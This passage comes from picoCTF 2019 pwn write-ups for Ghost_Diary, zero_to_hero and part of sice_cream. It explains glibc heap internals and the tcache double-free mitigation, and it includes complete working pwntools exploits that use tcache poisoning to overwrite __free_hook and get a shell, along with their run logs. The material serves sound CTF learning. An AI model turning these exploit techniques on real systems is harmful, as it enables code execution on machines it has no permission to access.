* Finally, this entire consolidated chunk (size 0x350) is placed into the unsorted bin, and its `fd` and `bk` pointers are set to point into the unsorted bin in the `main_arena` which is in libc. This entire chunk essentially is placed right on top of chunks A, B, and C:

```c
gef➤  heap bin unsorted

[+] unsorted_bins[0]: fw=0x55a7bc254250, bk=0x55a7bc254250
 →   Chunk(addr=0x55a7bc254260, size=0x350, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.

gef➤  x/150gx 0x55a7bc254250
0x55a7bc254250: 0x0000000000000000      0x0000000000000351 <- consolidated chunk A
0x55a7bc254260: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers
...
0x55a7bc254370: 0x0000000000000000      0x0000000000000000
0x55a7bc254380: 0x0000000000000130      0x0000000000000120 <- chunk B
0x55a7bc254390: 0x4242424242424242      0x4242424242424242
...
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
0x55a7bc2544b0: 0x4343434343434343      0x4343434343434343
0x55a7bc2544c0: 0x4343434343434343      0x4343434343434343
...
```

#### Step 7: **Empty the 0x128 tcache bin in order to use the unsorted bin**

* We must now empty the 0x128 sized tcache bin, so that any mallocs we make with size 0x128 will come out of the unsorted bin. We need to do this because the tcache bin takes priority over the unsorted bin for allocations.

* We do this simply by allocating 7 chunks of size 0x128, so that the 7 chunks in the tcache bin of size 0x128 are taken out.

#### Step 8: **Allocate chunk A back again to move the libc pointers into chunk B**

* We now add a chunk of size 0x128, which gets serviced by the unsorted bin. This will take a 0x128 size chunk out from the 0x350 sized chunk already in the unsorted bin and return it to us. In this case, this returns the chunk A that we initially allocated back to us.

* The key part is that it moves the libc pointers that were in chunk A's `fd` and `bk` down to chunk B, which we ***still*** have a pointer to. This is shown below:

```c
gef➤  x/150gx 0x55a7bc254250
0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- allocated 0x128 bytes to get chunk A
0x55a7bc254260: 0x00007f7e28fbefe0      0x00007f7e28fbefe0
...
0x55a7bc254380: 0x0000000000000130      0x0000000000000221 <- New consolidated chunk, where chunk B was (and still is)
0x55a7bc254390: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers moved down
0x55a7bc2543a0: 0x4242424242424242      0x4242424242424242
...
0x55a7bc254490: 0x4242424242424242      0x4242424242424242
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
0x55a7bc2544b0: 0x4343434343434343      0x4343434343434343
0x55a7bc2544c0: 0x4343434343434343      0x4343434343434343
```

#### Step 9: **Use the existing pointer to chunk B to read the libc address of the main_arena**

* Since we still have a pointer to chunk B, we simply use it to read chunk B's contents. In this case, it gives us our libc pointer leak, which we use to calculate the libc base address.

* With the base address, we also calculate the address of `__free_hook`, which is a function pointer that `free()` uses if it is set by the user. If we overwrite this function pointer with a pointer of our choosing, then the next time `free()` is called, it will also call the function pointed to by `__free_hook`, giving us code execution. Code found [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L3084) and shown below:

```c
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0)); // Calls the function pointed to be __free_hook
      return;
    }
  ...
```

* We must overwrite something like `__free_hook` or `__malloc_hook` (which is malloc's version of the function pointer) because **Full RELRO** is enabled. If it wasn't, we would just overwrite a GOT table entry (`printf` would work).

* With the base address, we also calculate the address of our `one_gadget`, which is essentially a set of instructions in libc that correspond to `execve("/bin/sh", NULL, NULL)`. The one gadget address is found by running david942j's [one_gadget](https://github.com/david942j/one_gadget) tool on `libc-2.27.so`.

* The calculated addresses are shown when the program is ran:

```c
[*] main arena leak: 0x7f7e28fbeca0
[*] Libc base: 0x7f7e28bd3000
[*] one gadget: 0x7f7e28c22322
[*] free_hook: 0x7f7e28fc08e8
```

#### Step 10: **Tcache Poisoning Attack to get malloc to return an arbitrary pointer to us**

* Next, we do a tcache poisoning attack to get a chunk on top of `__free_hook`. I initially fill up the 0x128 sized tcache bin so that its easier to know which index each malloc will go into.

* Next, we add a chunk of size 0x1d8. This will get serviced by the unsorted bin since there is no tcache bin of that size. This gives us a chunk right on top of chunk B, as that was where the consolidated unsorted bin chunk was prior to this malloc. We now have overlapped chunks on top of chunk B.

* Now that we have two pointers to chunk B, we do a double free, which causes the tcache bin for 0x1d8 chunks (the 0x1d0 sized tcache bin) to have the same chunk twice, visualized below:

```c
tcachebin[0x1d0] <- chunk B <- chunk B
```

* We allocate a chunk of size 0x1d8 again, which gives us back one of the chunks from the 0x1d0 sized tcache bin. The tcache bin now looks like the following:

```c
tcachebin[0x1d0] <- chunk B
```

* We set chunk B's `fd` pointer to the address of `__free_hook`. The tcache bin now looks like this:

```c
tcachebin[0x1d0] <- chunk B <- &__free_hook
```

* We do two more mallocs of size 0x1d8, where the first malloc gives us chunk B from the tcache bin, and the second malloc gives us a chunk right on top of `__free_hook`.

* We then overwrite that chunk on `__free_hook` with the address of our one_gadget:

```c
gef➤  x/10gx 0x7f7e28fc08e8
0x7f7e28fc08e8 <__free_hook>:   0x00007f7e28c22322      0x0000000000000000
...
```

* Finally, we call `free()` one more time, which calls the function pointed to by `__free_hook`, which is our one gadget, thus giving us a shell.

#### Final exploit

```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

elf = ELF('./ghostdiary')
p = process('./ghostdiary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Credits to teamrocketist for the following two functions, they help immensely when trying
# to debug exploits
def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
  script = ""
  PIE = get_base_address(p)
  for bp in breakpoints:
    script += "b *0x%x\n"%(PIE+bp)
  gdb.attach(p,gdbscript=script)

# Application logic functions
def add(size):
  p.sendlineafter('> ', '1')

  if size <= 0xf0:
    p.sendlineafter('> ', '1')
  else:
    p.sendlineafter('> ', '2')

  p.sendlineafter(': ', str(size))

def talk(page, content):
  p.sendlineafter('> ', '2')
  p.sendlineafter(': ', str(page))
  p.sendafter(': ', str(content))

def listen(page):
  p.sendlineafter('> ', '3')
  p.sendlineafter(': ', str(page))
  content = p.recvline().split(': ')[1].strip('\n')
  return content

def free(page):
  p.sendlineafter('> ', '4')
  p.sendlineafter(': ', str(page))

if args.GDB:
  debug([0x1024])

# Exploit goes here

# Setup
add(0x128) # A, idx 0
add(0x118) # B, idx 1
add(0x118) # C, idx 2

# Fill up tcache bin 0xf0
# Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
# Meaning that it will change the next chunks size to 0x100
# 0x100 chunks go into the 0xf0 tcache bin
# We prevent this since we want backwards cnosolidation to occur
# This will be evident further below
for i in range(7):
  add(0xf0)
for i in range(7):
  free(i+3)

# Fill up tcache bin 0x128
# We do this because of the same reason above
for i in range(7):
  add(0x128)
for i in range(7):
  free(i+3)

# Make chunk A go into unsorted bin
# This is important because we are consolidating chunk C back with both chunks A and B
# Meaning that unlink will be called with chunk A as it's second argument
# unlink has some security checks, one being that A's fd and bk must have valid pointers
# This free will put the pointers to `main_arena+0x58` into the fd and bk of A
free(0)

# Null byte overflow onto chunk C.
# C's size is now 0x100.
# C's prev_size is also set to 0x250
talk(1, 'B'*0x110 + p64(0x250))

# Before we free chunk C, we must create a fake chunk 0x100 bytes after chunk C
# This fake chunk must have its PREV_INUSE bit set to 1, hence we choose size 0x21
# This is required to bypass some checks when a chunk is freed into the unsorted bin
talk(2, 'C'*0xf8 + p64(0x21) + '\n')

# We free C now.
# C's prev_size is 0x250, so it will consolidate backwards 0x250 bytes (all the way up to A)
# Unsorted bin will now have a 0x350 sized chunk right on top of A
# A's fd and bk pointers will still have pointers to `main_arena+0x58`
free(2)

# Empty the 0x128 tcache bin so we can get chunks out of the unsorted bin
# Indexes taken up: 0, 2, 3, 4, 5, 6, 7
for i in range(7):
  add(0x128)

# Now adding a chunk of size 0x128 gives us a chunk from the unsorted bin
# In this case, unsorted bin will have a 0x350 sized chunk on chunk A
# We first add a 0x128 sized chunk so that the libc address gets moved down to chunk B
# This happens because now the unsorted bin will have a chunk starting at chunk B
add(0x128) # idx 8

# Now since we have a pointer to chunk B, we can leak the the fd pointer
# Remember the fd pointer just points to `main_arena+0x58`
libc_leak = u64(listen(1).ljust(8, '\x00'))

# Calculate needed offsets
libc.address = libc_leak - 0x3ebca0
one_gadget = libc.address + 0x4f322
free_hook = libc.symbols['__free_hook']

log.info('main arena leak: ' + hex(libc_leak))
log.info('Libc base: ' + hex(libc.address))
log.info('one gadget: ' + hex(one_gadget))
log.info('free_hook: ' + hex(free_hook))

# Fill up the 0x128 tcache bin again
# We do this to make subsequent mallocs easier to use
# It is easier to visualise the indexes in my opinion
# Indexes freed: 0, 2, 3, 4, 5, 6, 7
free(0)
for i in range(2, 8):
  free(i)

# Add overlapped chunk with B with size 0x1d8, this creates a new tcache bin when freed
# The new tcache bin is used for the tcache poisoning attack
# Otherwise there are some checks to bypass if we do an fastbin attack (for example)
# It's just easier to do it with the tcache bins
add(0x1d8) # idx 0, overlapped with the starting chunk B

# At this point, the two overlapped chunks are at indexes 0 and 1
# Double free them and put them into tcache bin 0x1d8
free(0)
free(1)

# Add one of them, change its fd to __free_hook
add(0x1d8) # idx 0
talk(0, p64(free_hook) + '\n')

# Two more chunks and we get a chunk on __free_hook
add(0x1d8) # 1, overlapped chunk with chunk B again
add(0x1d8) # 2, chunk on __free_hook

# Overwrite __free_hook with one_gadget
talk(2, p64(one_gadget) + '\n')

# Trigger __free_hook which gives us shell
free(1)

p.interactive()
```

Running the exploit now on the shell server gives us the flag:
```sh
redacted@pico-2019-shell1:/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578$ python2 ~/exploit.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/warlock/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.2)
[*] '/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578/ghostdiary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './ghostdiary': pid 2346543
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] main arena leak: 0x7f0925653ca0
[*] Libc base: 0x7f0925268000
[*] one gadget: 0x7f09252b7322
[*] free_hook: 0x7f09256558e8
[*] Switching to interactive mode
$ ls
flag.txt  ghostdiary  ghostdiary.c
$ cat flag.txt
picoCTF{nu11_byt3_Gh05T_82783d57}$  
```

# zero_to_hero

This is essentially a tcache poisoning attack using a double free. We just have to bypass the new double free security check introduced in glibc 2.28. Of course, just a double free is not enough to solve it, so the author `poortho` (amazing challenge author by the way) also conveniently put in a single NULL byte overflow vulnerability for us.

### **Challenge**

* **Category:** pwn
* **Points:** 500
* **Solves:** 31

>Now you're really cooking. Can you pwn [this](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/zero_to_hero) service?. Connect with `nc 2019shell1.picoctf.com 49929`. [libc.so.6](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/libc.so.6) [ld-2.29.so](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/ld-2.29.so)

### Solution

As mentioned above, this is a classic tcache poisoning attack with the added double free security check. We bypass that using the single NULL byte overflow vulnerability.

I had to use `patchelf` to change the linker the binary was using, because otherwise it didn't want to run.

#### Reverse Engineering the binary

The binary is very easy to understand. The following are its characteristics:
```sh
vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero$ file zero_to_hero
zero_to_hero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cf8bd977ca01d23e9b004a6dc637d6ab7c56e656, stripped

vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero$ checksec zero_to_hero
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
```

It has the following functionality:

1. It begins by asking you if you want to be a hero. Simply typing in any string with 'y' as the first character will work.

2. It will give you the address of `system` from libc, so no leak is required.

3. It lets you `add` superpowers. You can give each superpower a description that has a size <= 0x408 (so only tcache size). You can allocate max of 7 chunks, and you cannot change this limit no matter what. Therefore we are completely restricted to tcache chunks.

4. Each chunk is stored in a global array, and when you `free` a chunk, its pointer in that array is not nulled out. Therefore, we can do double frees on these chunks.

This challenge is actually really simple, but it requires some background knowledge about how the tcache works and how the mitigation that was introduced in glibc-2.28 works as well.

For an introduction on how the tcache works, I would suggest reading my writeup of [Ghost_Diary](/2019-10-12-picoctf-2019-ghostdiary/) from picoCTF 2019. I will only talk about the new mitigations here.

#### Tcache double free mitigation post glibc-2.28

Before glibc-2.28, you could double free tcache chunks as many times as you'd want so long as the corresponding tcache bin didn't fill up to its max limit of 7. This started being used so much for exploits, that a mitigation was added in glibc-2.28, as follows:
```c
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key; // essentially the bk pointer
} tcache_entry;
```

Since the `bk` pointer isn't actually used in the tcache, a `key` attribute was added to the `tcache_entry` struct, whose primary reason for existence was to detect double frees. How does it work?

In order to understand it completely, we must look at the code for the `tcache_get` and `tcache_put` functions:
```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache; // [1]

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```

Essentially, whenever we free a tcache chunk, `tcache_put` will be called, and `e->key` (the chunk's `bk` field) will be set to the address of the `tcache_perthread_struct` on the heap (amongst other things). [1]

Likewise, whenever we get a tcache chunk out of a tcache bin, `tcache_get` will be called which will null `e->key`.

As the comment says, the chunk is marked as "in the tcache" so that `_int_free` can make sure the chunk isn't being double freed. The check in `_int_free` is as follows:
```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  ...

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache)) // [2]
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)                      // [3]
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
  ...
```

At [2], we see that it first checks to see whether the tcache chunk's `key` field (again, essentially its `bk` pointer) is equal to the address of the `tcache_perthread_struct` on the heap. If it is, then it starts going through this tcache chunk's corresponding tcache bin.

If it finds this chunk already in that tcache bin, then it will error out and call `malloc_printerr` and output `free(): double free detected in tcache 2`.

Therefore we have the following condition:
```
When free is called on chunk:
IF (chunk->key == &tcache_perthread_struct AND
  tcachebin[chunk_idx] contains this chunk) THEN:
    DOUBLE FREE DETECTED
```

Knowing all this, we can double free in the following two ways:

1. Free the chunk, then use a UAF to overwrite `chunk->key` to any other value, and we will be able to free it again.

2. Free the chunk into one tcache bin, then change its size. You can immediately free it again and put it into a different tcache bin. You can then get the chunk back from the old tcache bin (prior to its size change) and immediately free it again due to the `e->key` field being nulled out. Now the new (second) tcache bin will have a double freed chunk in it.

For this challenge, we utilize the single NULL byte overflow to do it the second way.

#### Exploitation steps

First, as usual, we create our helper functions as follows:
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './zero_to_hero'
HOST, PORT = '2019shell1.picoctf.com', 49929

elf = ELF(BINARY)
libc = ELF('./libc-2.29.so')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(answer):
    p.recv()
    p.send(answer)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])
```

Now, we do the following steps in order, using our knowledge of how the new mitigation works.

First, we answer the initial question with a 'y'. We then use the leaked address of `system` to calculate the libc base address and subsequently the address of `__free_hook`:
```python
initialize('y')

# Calculate everything
p.recvuntil(': ')
system = int(p.recvuntil('\n').strip('\n'), 16)
libc.address = system - libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
```

Next we need to add two chunks. The first chunk's size doesn't matter, I arbitrarily choose 0x58 (chunk 0). The second chunk though has to be a size >= 0x100. I arbitrarily chose 0x180 (chunk 1).

We will free chunk 0, then chunk 1. Chunk 0 will go into the 0x50 tcache bin, while chunk 1 will go into the 0x180 tcache bin. I then get back chunk 0, and use the single NULL byte overflow to overwrite chunk 1's size from 0x191 to 0x100. I also set the first 8 bytes of chunk 0 to `'/bin/sh\x00'` for later use.

Since chunk 1's size changed from 0x191 to 0x100, we can immediately free it again. This time, it will go into the 0xf0 tcache bin.
```python
# Add a 0x50 and 0x180 chunk
add(0x58, 'A'*0x58) # Chunk A
add(0x180, 'B'*0x180) # Chunk B

# Free them both
free(0) # Goes into 0x50 tcache bin
free(1) # Goes into 0x180 tcache bin

# Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
add(0x58, '/bin/sh\x00' + 'A'*0x50) # Chunk A

# The 0x180 chunk's size is now actually 0x100 (due to null byte overflow)
# This means we can free it again immediately
free(1) # Goes into 0xf0 tcache bin
```

Remember the chunk that went into the 0x180 tcache bin? It is the same chunk, only now its size is actually 0x100. We reallocate it back out of the 0x180 tcache bin, and immediately free it. What happens now is that the same chunk is in the 0xf0 tcache bin twice, as if we had double freed it.
```python
# Get back the 0x100 chunk out of the 0x180 tcache bin
add(0x180, 'C'*0x180) # Chunk B

# Since tcache_get will null out the key, we can free it immediately
free(3) # Goes into 0xf0 tcache bin

# Now: tcache[0x100] -> Chunk B <- Chunk B
```

After that, it's the usual tcache poisoning attack to get a chunk on `__free_hook` and overwrite it with the address to `system`:
```python
# We do the usual tcache poisoning attack

# Get Chunk B from 0xf0 tcache bin and change it's FD to __free_hook
add(0xf0, p64(free_hook) + 'D'*0xe8)

# Allocates chunk B again
add(0xf0, 'E'*0xf0)

# Allocates chunk on __free_hook, change it to system
add(0xf0, p64(system) + 'F'*0xe8)
```

Now, remember when we changed chunk 0's first 8 bytes to `'/bin/sh\x00'`? If we call `free(0)`, it will actually call `free(ptr_to_chunk_0)`, which means it will now also call `((*)__free_hook)(ptr_to_chunk_0, ...)`.

Since we changed `__free_hook` to point to `system`, it will actually call `system(ptr_to_chunk_0)`, and if you imagine `ptr_to_chunk_0` to be a `char *`, it will call `system("/bin/sh\x00")`, giving us a shell:
```python
# Call free on the chunk with /bin/sh\x00 in it
# This will then call free('/bin/sh\x00') which calls system('/bin/sh\x00')
free(0)

p.interactive()
```

And so we use exactly 7 chunks to do the exploit. Perfect limit.

### Final exploit:

```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './zero_to_hero'
HOST, PORT = '2019shell1.picoctf.com', 49929

elf = ELF(BINARY)
libc = ELF('./libc-2.29.so')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(answer):
    p.recv()
    p.send(answer)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

initialize('y')

# Calculate everything
p.recvuntil(': ')
system = int(p.recvuntil('\n').strip('\n'), 16)
libc.address = system - libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

# Add a 0x50 and 0x180 chunk
add(0x58, 'A'*0x58) # Chunk A
add(0x180, 'B'*0x180) # Chunk B

# Free them both
free(0) # Goes into 0x50 tcache bin
free(1) # Goes into 0x180 tcache bin

# Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
add(0x58, '/bin/sh\x00' + 'A'*0x50) # Chunk A

# The 0x180 chunk's size is now actually 0x100 (due to null byte overflow), so we can free it again
free(1) # Goes into 0xf0 tcache bin

# Get back the 0x100 chunk out of the 0x180 tcache bin
add(0x180, 'C'*0x180) # Chunk B

# But remember that it's size is still 0x100, so we can free it immediately
free(3) # Goes into 0xf0 tcache bin

# Now: tcache[0x100] -> Chunk B <- Chunk B
# We do the usual tcache poisoning attack

# Get Chunk B from 0xf0 tcache bin and change it's FD to __free_hook
add(0xf0, p64(free_hook) + 'D'*0xe8)

# Allocates chunk B again
add(0xf0, 'E'*0xf0)

# Allocates chunk on __free_hook, change it to system
add(0xf0, p64(system) + 'F'*0xe8)

# Call free on the chunk with /bin/sh\x00 in it
# This will then call free('/bin/sh\x00') which calls system('/bin/sh\x00')
free(0)

p.interactive()
```
```sh
vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/libc-2.29.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2019shell1.picoctf.com on port 49929: Done
[*] Libc base: 0x7f0d11c61000
[*] system: 0x7f0d11cb3fd0
[*] __free_hook: 0x7f0d11e485a8
[*] Switching to interactive mode
$ ls
flag.txt
ld-2.29.so
libc.so.6
xinet_startup.sh
zero_to_hero
$ cat flag.txt
picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_fjqlovui}
```

# sice_cream

The solution that I came up with (including some help :P) for this challenge is absolutely mind blowing. I'm still not sure if it's the intended solution.

There is also what I think is the official solution (`NotDeGhost` from redpwn told me about it after I solved it), so I will showcase that at the end of this writeup as well.

I usually put a TL;DR here, but no TL;DR will sufficiently show how amazing this challenge is. Huge props to the author `poortho`.

### **Challenge**

* **Category:** pwn
* **Points:** 500
* **Solves:** 25

>Just pwn this [program](https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/sice_cream) and get a flag. Connect with `nc 2019shell1.picoctf.com` 6552 . [libc.so.6](https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/libc.so.6) [ld-2.23.so](https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/sice_cream)

### **Solution**

Disclaimer: I won't cover the basics of heap exploitation in this post. I have one post relating to a very easy glibc 2.23 heap exploitation challenge ([BSides Delhi 2019: message_saver](/2019-09-30-bsides-delhi-message-saver/)), and another going much more in-depth with regards to how `malloc` and `free` kind of function, as well as what chunks and bins are ([picoCTF 2019: Ghost_Diary](/2019-10-12-picoctf-2019-ghostdiary/)). If the terminology is unfamiliar to you, I suggest going through those writeups.

#### Reverse Engineering the binary

The binary is pretty easy to reverse, so I will not go into details as to how I did it. I had to use `patchelf` initially to change which linker it was using, but other than that, here are its characteristics:
```sh
vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ file sice_cream
sice_cream: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4112386366befae2dee50fe8ed7c013a8241c69c, stripped

vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ checksec sice_cream
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
```

The program allows us to do the following:

* All user input in the program is done through the `read` function.

* At the beginning of the program, we are allowed to input 0x100 bytes for our name. This name variable is stored in the .bss segment, and since PIE is disabled, it is stored at the known address 0x602040.

* We are allowed to allocate chunks of size <= 0x58. This is essentially what made this challenge so difficult. I will explain a bit more about that below. We are also only allowed to allocate 19 chunks total. There is no way to bring that limit down. Of course we find a way to do it anyway ;)

* Each allocated chunk is stored in a global array of pointers. This pointer is also at a known address right after the name variable. We can free these pointers, and the pointers themselves are not set to NULL after each free, thus allowing us to do double frees.

* We can "reintroduce" ourselves, and change our name. This functionality, as you will soon see, is a godsend for this challenge. It will read in 0x100 bytes again, then it print out our new name. This is the only form of a "leak" we have, so we have to use this to our advantage.

Let's get onto exploiting now.

#### Step 1: **Unsorted bin leak**

As usual with heap challenges, we must first start out by getting a libc leak. I first added the application logic functions and some helper functions at the top:
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])
```

The way I got the libc leak was to do the following steps:

1. At the beginning of the program, make our name look like a fake chunk of 0x61 size.

1. Allocate three chunks of size 0x58.

2. Double free one of them (`free(0)` -> `free(1)` -> `free(1)`).

3. Reallocate a chunk of size 0x58, then set its first 8 bytes (the fd pointer) to our name variable.

4. Three more allocations later, and we get a chunk right on top of our name variable

5. Now we reintroduce ourselves again and make the chunk header a size of 0x91 and create a bunch of fake chunks

6. Free the chunk, and it places the address of `main_arena + 0x58` into the `fd` and `bk` fields of our "fake" chunk

7. Leak it by reintroducing ourselves and typing in enough characters

```python
'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
